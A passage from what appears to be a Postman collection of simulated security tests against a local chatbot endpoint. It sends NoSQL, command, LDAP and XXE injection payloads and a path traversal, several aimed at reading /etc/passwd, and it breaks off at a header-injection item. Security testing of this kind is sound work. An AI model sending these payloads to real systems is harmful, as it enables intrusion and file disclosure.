  "item": [
    {
      "name": "01 - NoSQL Injection (simulada)",
      "request": {
        "method": "POST",
        "header": [ { "key": "Content-Type", "value": "application/json" } ],
        "body": { "mode": "raw", "raw": "{\n  \"message\": \"{ \n  \\\"$where\\\": \\\"sleep(5000)\\\" }\"\n}" },
        "url": { "raw": "http://localhost:8081/chatbot", "protocol": "http", "host": ["localhost"], "port": "8081", "path": ["chatbot"] }
      }
    },
    {
      "name": "02 - Command Injection (simulada)",
      "request": {
        "method": "POST",
        "header": [ { "key": "Content-Type", "value": "application/json" } ],
        "body": { "mode": "raw", "raw": "{\n  \"message\": \"; ls -la / || dir \\; cat /etc/passwd\"\n}" },
        "url": { "raw": "http://localhost:8081/chatbot", "protocol": "http", "host": ["localhost"], "port": "8081", "path": ["chatbot"] }
      }
    },
    {
      "name": "03 - Path Traversal (simulado)",
      "request": {
        "method": "POST",
        "header": [ { "key": "Content-Type", "value": "application/json" } ],
        "body": { "mode": "raw", "raw": "{\n  \"message\": \"../../../../etc/passwd\"\n}" },
        "url": { "raw": "http://localhost:8081/chatbot", "protocol": "http", "host": ["localhost"], "port": "8081", "path": ["chatbot"] }
      }
    },
    {
      "name": "04 - LDAP Injection (simulada)",
      "request": {
        "method": "POST",
        "header": [ { "key": "Content-Type", "value": "application/json" } ],
        "body": { "mode": "raw", "raw": "{\n  \"message\": \"*)(|(user=*))\"\n}" },
        "url": { "raw": "http://localhost:8081/chatbot", "protocol": "http", "host": ["localhost"], "port": "8081", "path": ["chatbot"] }
      }
    },
    {
      "name": "05 - XML External Entity (XXE) (simulada)",
      "request": {
        "method": "POST",
        "header": [ { "key": "Content-Type", "value": "application/json" } ],
        "body": { "mode": "raw", "raw": "{\n  \"message\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>\"\n}" },
        "url": { "raw": "http://localhost:8081/chatbot", "protocol": "http", "host": ["localhost"], "port": "8081", "path": ["chatbot"] }
      }
    },
    {
      "name": "06 - HTTP Header Injection (simulada)",
      "request": {
        "method": "POST",
        "header": [
